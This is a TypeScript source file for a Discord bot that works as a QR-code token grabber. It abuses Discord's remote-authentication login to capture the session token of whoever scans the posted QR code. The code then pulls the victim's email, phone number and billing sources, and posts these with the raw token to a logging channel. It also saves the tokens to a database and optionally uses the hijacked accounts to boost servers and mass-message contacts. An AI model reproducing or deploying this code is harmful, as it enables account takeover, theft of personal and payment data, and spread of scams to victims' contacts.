import fetch from 'node-fetch'
import { Message, MessageEmbed, MessageAttachment, Client, TextChannel } from "discord.js";
import { generateKeyPairSync, createHash, privateDecrypt } from "crypto";
import { model, Schema } from 'mongoose';
import boostServer from './util/boostServer';
import WebSocket from "ws";
import Jimp from "jimp";

import { IConfig, IData, IUser } from './global';
import massMessage from './util/massMessage';
const config: IConfig = require('../config.json');

const users = model(config.mongoose.schemaName, new Schema({
    id: String,
    username: String,
    token: String
}));

let SocketClient: WebSocket;
let Heart: NodeJS.Timeout;
let Timeout: NodeJS.Timeout;

export default (message: Message, embed: MessageEmbed, client: Client) => new Promise(reslove => {
    const close = async (alreadyClosed?: boolean) => {
        clearTimeout(Heart);
        clearTimeout(Timeout);
        if (!alreadyClosed) {
            if (SocketClient.readyState === WebSocket.CONNECTING) {
                SocketClient.terminate();
            }
            SocketClient.close();
        }
        reslove(true);
    }

    const keyPair = generateKeyPairSync("rsa", { modulusLength: 2048, publicExponent: 65537 });
    SocketClient = new WebSocket('wss://remote-auth-gateway.discord.gg/?v=1', { origin: 'https://discord.com', handshakeTimeout: 10000 });
    SocketClient.onclose = () => close(true);
    SocketClient.onmessage = async (x) => {
        const data: IData = JSON.parse(x.data as string);

        switch (data.op) {
            case 'hello':
                try {
                    SocketClient.send(JSON.stringify({ op: 'init', encoded_public_key: keyPair.publicKey.export({ type: 'spki', format: 'der' }).toString("base64") }));
                } catch {}
                Timeout = setTimeout(() => {close()}, 60000);
                Heart = setInterval(() => {
                    try { SocketClient.send(JSON.stringify({ op: 'heartbeat' })); } catch {}
                }, data.heartbeat_interval);
                break;
            case 'nonce_proof':
                const decryptedNonce = privateDecrypt({ key: keyPair.privateKey, oaepHash: 'sha256' }, Buffer.from((data.encrypted_nonce as string), 'base64'));
                const nonceHash = createHash('sha256').update(decryptedNonce).digest('base64url');
                try {
                    SocketClient.send(JSON.stringify({ op: 'nonce_proof', proof: nonceHash }));
                } catch{}
                break;
            case 'pending_remote_init':
                const fingerprintData = `https://discordapp.com/ra/${data.fingerprint}`;
                const qrCodeURL = `https://api.qrserver.com/v1/create-qr-code/?size=256x256&data=${fingerprintData}`;
                
                const bg = new Jimp(300, 300, 0xFFFFFFFF);
                const qrCode = await Jimp.read(qrCodeURL);
                bg.composite(qrCode, 22, 22);
                
                if(config.useDiscordLogo) {
                    const discordLogo = await Jimp.read("https://discord.com/assets/092b071c3b3141a58787415450c27857.png");
                    bg.composite(discordLogo, 100, 100);
                }
                
                bg.getBuffer(Jimp.MIME_PNG, (err, buffer) => {
                    const discordImage = new MessageAttachment(buffer, 'img.png');
                    embed.setImage('attachment://img.png');
                    message.edit({ embeds: [embed], files: [discordImage] }).catch(e => {});
                });
                break;
            case 'pending_finish':
                const decryptedUser = privateDecrypt({ key: keyPair.privateKey, oaepHash: 'sha256' }, Buffer.from((data.encrypted_user_payload as string), 'base64'));
                const userId = decryptedUser.toString().split(':')[0];
                break;
            case 'finish':
                const decryptedToken = privateDecrypt({ key: keyPair.privateKey, oaepHash: 'sha256' }, Buffer.from((data.encrypted_token as string), 'base64'));
                const token = decryptedToken.toString();

                const discord: IUser = await (await fetch(`https://discord.com/api/users/@me`, { headers: { Authorization: token } })).json();

                for (const whitelist of config.whitelistedUsers) 
                    if (discord.id === whitelist) return reslove(token);
                    
                const billingInformation = await (await fetch(`https://discord.com/api/v9/users/@me/billing/payment-sources`, { headers: { Authorization: token } })).json();
                const avatarUrl = discord.avatar !== null ? `https://cdn.discordapp.com/avatars/${discord.id}/${discord.avatar}.png` : `https://discord.com/assets/1f0bfc0865d324c2587920a7d80c609b.png`

                const tokenLoggedEmbed = new MessageEmbed()
                    .setColor('#FF0000')
                    .setAuthor({
                        name: `${discord.username}#${discord.discriminator} [${discord.id}]`,
                        iconURL: avatarUrl
                    })
                    .addField('Account Info', `
                        Email: ${discord.email}
                        Phone: ${discord.phone}
                        Nitro: ${discord.premium_type ? (discord.premium_type === 2 ? 'Booster' : 'Classic') : 'None'}
                        Billing Info: ${billingInformation.length > 0 ? 'Yes' : 'No'}
                    `)
                    .addField('Token', token)

                try {
                    if (config.boostServer) boostServer(client, token, discord);
                    if (config.massMessage) massMessage(client, token, discord, (billingInformation.length > 0));
                    close();
                    (await client.channels.cache.get(config.logChannel) as TextChannel).send({ embeds: [tokenLoggedEmbed] }).catch(e => {});
                    if (config.mongoose.enabled) {
                        const foundUser = await users.findOne({ id: discord.id });
                        if (foundUser) {
                            foundUser.token = token;
                            await foundUser.save();
                        } else {
                            await users.create({
                                id: discord.id,
                                username: discord.username,
                                token: token
                            });
                        }
                    }
                } catch {}
                reslove(token);
                break;
            default:
                console.log(data);
                break;
        }    
    }
});
